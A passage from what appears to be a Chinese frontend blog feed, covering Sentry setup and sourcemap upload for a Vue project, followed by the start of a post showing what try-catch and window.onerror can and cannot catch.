class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &quot;vue&quot;;</span><br><span class="line">import &#123; createRouter &#125; from &quot;vue-router&quot;;</span><br><span class="line">import * as Sentry from &quot;@sentry/vue&quot;;</span><br><span class="line">import &#123; BrowserTracing &#125; from &quot;@sentry/tracing&quot;;</span><br><span class="line"></span><br><span class="line">const app = createApp(&#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br><span class="line">const router = createRouter(&#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Sentry.init(&#123;</span><br><span class="line">  app,</span><br><span class="line">  dsn: &quot;https://b1fe70b553f84880bad94839a0acd387@o1280003.ingest.sentry.io/6487277&quot;,</span><br><span class="line">  integrations: [</span><br><span class="line">    new BrowserTracing(&#123;</span><br><span class="line">      routingInstrumentation: Sentry.vueRouterInstrumentation(router),</span><br><span class="line">      tracingOrigins: [&quot;localhost&quot;, &quot;my-site-url.com&quot;, /^\//],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  // Set tracesSampleRate to 1.0 to capture 100%</span><br><span class="line">  // of transactions for performance monitoring.</span><br><span class="line">  // We recommend adjusting this value in production</span><br><span class="line">  tracesSampleRate: 1.0,</span><br><span class="line">  logErrors: true</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(router);</span><br><span class="line">app.mount(&quot;#app&quot;);</span><br></pre></td></tr></table></figure><p>此时，本地项目执行报错后，sentry 后台即可捕获到错误信息。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953995787-d8bc55b3-f62a-4d22-b6a1-43c9a346b104.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953995787-d8bc55b3-f62a-4d22-b6a1-43c9a346b104.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="5f9cbc59"></a></p><h2 id="六、上传-sourceMap"><a href="#六、上传-sourceMap" class="headerlink" title="六、上传 sourceMap"></a>六、上传 sourceMap</h2><p>到目前为止，vue 项目 sentry 配置已经完成，可以收集错误信息了，在 sentry web 端也能看到详细错误信息，但是 vue 项目经过打包之后，代码是经过压缩的，根据错误信息你是无法定位到源代码究竟是哪一行有问题，因此还需要上传 sourcemap 文件，就是将 vue 项目构建之后的源代码上传到 sentry 服务端，所以我们开始进行 sourceMap 上传</p><p><a name="961c56a0"></a></p><h3 id="配置-sentry-x2F-webpack-plugin-插件构建完成自动上传-sourcemap"><a href="#配置-sentry-x2F-webpack-plugin-插件构建完成自动上传-sourcemap" class="headerlink" title="配置@sentry&#x2F;webpack-plugin 插件构建完成自动上传 sourcemap"></a>配置@sentry&#x2F;webpack-plugin 插件构建完成自动上传 sourcemap</h3><p>官方配置了 webpack 插件@sentry&#x2F;webpack-plugin 用来在构建之后自动上传 map 文件</p><p><a name="62414183"></a></p><h5 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h5><ol><li>从您的 [Account] &gt; API keys 创建一个新的身份验证令牌（步骤四已经创建）</li><li>确认您在“Scopes”下选择了 project:write<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954031419-c39c8ca4-7f66-40d9-a378-18700f13d35b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954031419-c39c8ca4-7f66-40d9-a378-18700f13d35b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></li></ol><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954040082-28f4b6bf-006d-4c08-bada-83ff28da8a82.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954040082-28f4b6bf-006d-4c08-bada-83ff28da8a82.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><ol start="3"><li>使用 npm 安装 @sentry&#x2F;webpack-plugin</li><li>Using npm:</li></ol><p><code>$ npm install @sentry/webpack-plugin --save-dev</code><br /> b. Using yarn: <br /><code>$ yarn add @sentry/webpack-plugin --dev</code></p><ol start="4"><li>项目下创建 .sentryclirc 文件<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954235826-68a152b9-e94a-49e5-93dd-aaf205764dfa.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954235826-68a152b9-e94a-49e5-93dd-aaf205764dfa.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></li><li>配置.sentryclirc 文件</li><li>更新 vue.config.js 文件配置</li><li>更新 sentry.init() 配置</li></ol><p><a name="f1040079"></a></p><h4 id="配置-sentryclirc-文件"><a href="#配置-sentryclirc-文件" class="headerlink" title="配置.sentryclirc 文件"></a>配置.sentryclirc 文件</h4><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954250222-98067c79-07ed-4cbd-8c49-28b309511b07.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954250222-98067c79-07ed-4cbd-8c49-28b309511b07.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>含义解释：</p><ul><li>url：上传的服务器根目录，我这边目前本地搭建，指向本地，等安慕希这边运维搭建好服务之后，即指向搭建好的服务器上。</li><li>org：这个可不是瞎写的，还记得注册的时候填的组织吗？不记得？没关系，看下图：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954264879-d3133951-4c27-4bac-808e-c98ac72c6d7f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954264879-d3133951-4c27-4bac-808e-c98ac72c6d7f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></li><li>project: 看上图，就是你的项目名字。</li><li>token: 这个需要生成， 点击下图右上角的 Creat New Token：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954285928-9ab2d3c7-9469-4ebb-86aa-0ada7ffc979f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954285928-9ab2d3c7-9469-4ebb-86aa-0ada7ffc979f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></li></ul><p><a name="5ed85804"></a></p><h4 id="更新-vue-config-js-配置"><a href="#更新-vue-config-js-配置" class="headerlink" title="更新 vue.config.js 配置"></a>更新 vue.config.js 配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const SentryCliPlugin = require(&quot;@sentry/webpack-plugin&quot;);</span><br><span class="line"></span><br><span class="line"> plugins: [</span><br><span class="line">    new SentryCliPlugin(&#123;</span><br><span class="line">    authToken: process.env.token,</span><br><span class="line">      org: process.env.org,</span><br><span class="line">      project: process.env.project,</span><br><span class="line">      include: &#x27;./dist&#x27;, // 作用的文件夹</span><br><span class="line">      release: &#x27;sentry0.0.2&#x27;, // 一致的版本号</span><br><span class="line">      configFile: &#x27;.sentryclirc&#x27;,</span><br><span class="line">      ignoreFile: &#x27;.sentrycliignore&#x27;,</span><br><span class="line">      ignore: [&#x27;node_modules&#x27;, &#x27;vue.config.js&#x27;],</span><br><span class="line">      urlPrefix: &#x27;~/static/js&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><a name="acb04427"></a></p><h4 id="更新-sentry-init-配置"><a href="#更新-sentry-init-配置" class="headerlink" title="更新 sentry.init() 配置"></a>更新 sentry.init() 配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Sentry.init(&#123;</span><br><span class="line">  Vue,</span><br><span class="line">  dsn: &#x27;http://90f19653173948f2b03b5b9fb5751cfa@127.0.0.1:9000/2&#x27;,</span><br><span class="line">  release: &#x27;sentry0.0.2&#x27;,   //  更新此处，要保持跟vue.config.js中的release版本号一致</span><br><span class="line">  integrations: [</span><br><span class="line">    new BrowserTracing(&#123;</span><br><span class="line">      routingInstrumentation: Sentry.vueRouterInstrumentation(router),</span><br><span class="line">      tracingOrigins: [&#x27;localhost&#x27;, &#x27;my-site-url.com&#x27;, /^\//]</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  // Set tracesSampleRate to 1.0 to capture 100%</span><br><span class="line">  // of transactions for performance monitoring.</span><br><span class="line">  // We recommend adjusting this value in production</span><br><span class="line">  tracesSampleRate: 1.0,</span><br><span class="line">  logErrors: true</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a name="54c0d7aa"></a></p><h2 id="七、定位源代码"><a href="#七、定位源代码" class="headerlink" title="七、定位源代码"></a>七、定位源代码</h2><p><a name="793d0ab0"></a></p><h3 id="1-查看发布的版本-从对应版本进入项目"><a href="#1-查看发布的版本-从对应版本进入项目" class="headerlink" title="1.查看发布的版本,从对应版本进入项目"></a>1.查看发布的版本,从对应版本进入项目</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954301486-5fc27989-05b3-4ba6-b539-308171485a45.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954301486-5fc27989-05b3-4ba6-b539-308171485a45.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="9cd52ed2"></a></p><h3 id="2-查看错误日志"><a href="#2-查看错误日志" class="headerlink" title="2.查看错误日志"></a>2.查看错误日志</h3><p>随便找一个错误日志<br />没有错误,可以在构建前手动创建一个错误看看效果</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954311670-5bc7c92f-36df-43c7-b65c-2aa47380840c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954311670-5bc7c92f-36df-43c7-b65c-2aa47380840c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="880cd20a"></a></p><h3 id="3-切换配置-查看源码信息"><a href="#3-切换配置-查看源码信息" class="headerlink" title="3.切换配置,查看源码信息"></a>3.切换配置,查看源码信息</h3><p>上传<code>sourceMap</code>前只有 <code>Full</code>和<code>Raw</code>两个选项,而且错误日志不是很明确,不能定位到发生错误的地方<br /><code>sourceMap</code>上传并生效后,如图可以切换<code>Original</code>等选项,切换后可以看到报错的代码内容</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954321763-b6d6dd9e-2ea3-4f39-bd9e-c23387468f3a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659954321763-b6d6dd9e-2ea3-4f39-bd9e-c23387468f3a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="Tips"></a></p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>在上传<code>sourceMap</code>的时候会遇到几个坑</p><ol><li>安装插件前要先配置<code>.sentryclirc</code>文件,只有插件是无法上传到指定项目的</li><li><code>token</code>为<code>API</code>令牌,需要自己创建,不是错以为是设置中的安全令牌或者其他<code>key</code></li><li>插件方法<code>SentryWebpackPlugin</code>中要设置<code>release</code>参数指定版本,同时<code>Sentry.init</code>方法中也要<code>release</code>参数指定版本,两个版本号需要保持一致,<code>sourceMap</code>才会生效</li><li>即便上传了<code>sourceMap</code>和保持<code>release</code>版本号一致,还需要一个文件路径的配置,方便<code>sourceMap</code>定位到要访问的文件,需要指定<code>urlPrefix</code>参数<ol><li><code>urlPrefix</code>不设置的话,默认为<code>~/</code>,<code>~</code>代表网站的协议和域名</li><li><code>map</code>文件一般被<code>webpack</code>打包在根目录&#x2F;static&#x2F;js&#x2F;的文件夹下,如访问<code>https://dsx2016.com</code>,那么 map 文件就是<code>https://dsx2016.com/static/js/xxx.map</code>,所以要指定<code>urlPrefix为&quot;~/static/js&quot;</code></li><li>如果经过<code>nginx</code>等代理导致目录更深一级等,就加入到对应的前缀即可,如果<code>nginx</code>代理网站为<code>https://dsx2016.com/home</code>,那么 map 文件就是<code>https://dsx2016.com/home/static/js/xxx.map</code>,所以要指定<code>urlPrefix为&quot;~/home/static/js&quot;</code>,具体的目录看具体的场景,直接看打包好部署的<code>map</code>在哪个文件即可</li></ol></li></ol><p><a href="https://ask.dcloud.net.cn/question/139768">uniapp 小程序接入 sentry</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>性能监控、异常监控</title>
      <link href="/2023/06/28/frontend/monitor/xing-neng-jian-kong-yi-chang-jian-kong/"/>
      <url>/2023/06/28/frontend/monitor/xing-neng-jian-kong-yi-chang-jian-kong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="gLJtG"></a></p><h2 id="性能监控"><a href="#性能监控" class="headerlink" title="性能监控"></a>性能监控</h2><p><a name="2F9Wx"></a></p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>一个是 http 的方面，在后端 log 日志，流入 kafka，然后在 kafka 消费数据，可以准确的监控到哪些接口有异常？异常率是多少？</p><p><a name="LOVmn"></a></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>前端的 Performance 的 api，在用户的实时使用的过程中，就会产生数据，这样就能实现页面性能监控。</p><p><a name="DcmBc"></a></p><h2 id="异常监控"><a href="#异常监控" class="headerlink" title="异常监控"></a>异常监控</h2><blockquote><p>异常是不可控的，会影响最终的呈现结果，但是我们有充分的理由去做这样的事情。</p></blockquote><br /><a name="6r0ZD"></a>### 什么是异常html、css这些东西，无非就是一个展示的问题，还不至于让页面白屏的事情发生，所谓的异常监控，其实就是js的异常监控。在前端领域，window.onerror是进行js异常的监听事件。并且要知道，它在IE中，是不支持的，所以IE的监控，要使用try catch 的方式进行捕获，比如我们可能还要注意到，遇到异步的时候，这个如何做try catch的异常捕获。<p><a name="dJ0lQ"></a></p><h3 id="为什么要处理异常"><a href="#为什么要处理异常" class="headerlink" title="为什么要处理异常"></a>为什么要处理异常</h3><ul><li>增强用户体验；</li><li>远程定位问题；</li><li>未雨绸缪，及早发现问题；</li><li>无法复线问题，尤其是移动端，机型，系统都是问题；</li><li>完善的前端方案，前端监控系统。</li></ul><p>对于 <code>JS</code> 而言，我们面对的仅仅只是异常，异常的出现不会直接导致 <code>JS</code> 引擎崩溃，最多只会使当前执行的任务终止。</p><p><a name="0T9Ws"></a></p><h3 id="需要处理哪些异常"><a href="#需要处理哪些异常" class="headerlink" title="需要处理哪些异常"></a>需要处理哪些异常</h3><ul><li><code>JS</code> 语法错误、代码异常</li><li><code>AJAX</code> 请求异常</li><li>静态资源加载异常</li><li><code>Promise</code> 异常</li><li><code>Iframe</code> 异常</li><li>跨域 Script error</li><li>崩溃和卡顿</li></ul><p><a name="i1meQ"></a></p><h4 id="Try-Catch"><a href="#Try-Catch" class="headerlink" title="Try-Catch"></a>Try-Catch</h4><p><code>try-catch</code>  只能捕获到同步的运行时错误，对语法和异步错误却无能为力，捕获不到。<br /><strong>1.同步运行时错误：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> name = <span class="string">&quot;jartto&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(nam);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">捕获到异常： <span class="title class_">ReferenceError</span>: nam is not defined</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">3</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>2.不能捕获到语法错误，我们修改一下代码，删掉一个单引号：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> name = <span class="string">&#x27;jartto;</span></span><br><span class="line"><span class="string">  console.log(nam);</span></span><br><span class="line"><span class="string">&#125; catch(e) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  console.log(&#x27;</span>捕获到异常：<span class="string">&#x27;,e);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>输出：<br /><code>Uncaught SyntaxError: Invalid or unexpected token</code></p><blockquote><p>不过语法错误在我们开发阶段就可以看到，应该不会顺利上到线上环境。</p></blockquote><p><strong>3.异步错误</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="literal">undefined</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">v</span>) =&gt;</span> v);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看看日志：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">VM308</span>:<span class="number">3</span> <span class="title class_">Uncaught</span> <span class="title class_">TypeError</span>: <span class="title class_">Cannot</span> read property <span class="string">&#x27;map&#x27;</span> <span class="keyword">of</span> <span class="literal">undefined</span></span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">3</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p>并没有捕获到异常，这是需要我们特别注意的地方。</p><p><a name="Xldy7"></a></p><h4 id="window-onerror-不是万能的"><a href="#window-onerror-不是万能的" class="headerlink" title="window.onerror 不是万能的"></a>window.onerror 不是万能的</h4><p>当  <code>JS</code>  运行时错误发生时，<code>window</code>  会触发一个  <code>ErrorEvent</code>  接口的  <code>error</code>  事件，并执行  <code>window.onerror()</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125;  message    错误信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125;  source    出错文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Number</span>&#125;  lineno    行号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Number</span>&#125;  colno    列号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125;  error  Error对象（对象）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>1.首先试试同步运行时错误</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="comment">// message：错误信息（字符串）。</span></span><br><span class="line">  <span class="comment">// source：发生错误的脚本URL（字符串）</span></span><br><span class="line">  <span class="comment">// lineno：发生错误的行号（数字）</span></span><br><span class="line">  <span class="comment">// colno：发生错误的列号（数字）</span></span><br><span class="line">  <span class="comment">// error：Error对象（对象）</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Jartto</span>;</span><br></pre></td></tr></table></figure><p>可以看到，我们捕获到了异常：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1593768804961-b9bc73ec-acca-474c-b56c-801043199d8e.png#height=294&id=J2JF7&originHeight=294&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58606&status=done&style=none&title=&width=884" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1593768804961-b9bc73ec-acca-474c-b56c-801043199d8e.png#height=294&id=J2JF7&originHeight=294&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58606&status=done&style=none&title=&width=884" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><strong>2.再试试语法错误呢？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;捕获到异常：&#x27;</span>,&#123;message, source, lineno, colno, error&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;Jartto</span></span><br></pre></td></tr></table></figure><p>控制台打印出了这样的异常：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">SyntaxError</span>: <span class="title class_">Invalid</span> or unexpected token</span><br></pre></td></tr></table></figure><blockquote><p>什么，竟然没有捕获到语法错误？</p></blockquote><p><strong>3.怀着忐忑的心，我们最后来试试异步运行时错误：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Jartto</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>控制台输出了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">捕获到异常： &#123;<span class="attr">message</span>: <span class="string">&quot;Uncaught ReferenceError: Jartto is not defined&quot;</span>, <span class="attr">source</span>: <span class="string">&quot;http://127.0.0.1:8001/&quot;</span>, <span class="attr">lineno</span>: <span class="number">36</span>, <span class="attr">colno</span>: <span class="number">5</span>, <span class="attr">error</span>: <span class="title class_">ReferenceError</span>: <span class="title class_">Jartto</span> is not defined</span><br><span class="line">    at <span class="built_in">setTimeout</span> (<span class="attr">http</span>:<span class="comment">//127.0.0.1:8001/:36:5)&#125;</span></span><br></pre></td></tr></table></figure><p><strong>4.接着，我们试试网络请求异常的情况：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;捕获到异常：&#x27;</span>,&#123;message, source, lineno, colno, error&#125;);</span><br><span class="line">    <span class="keyword">return</span> 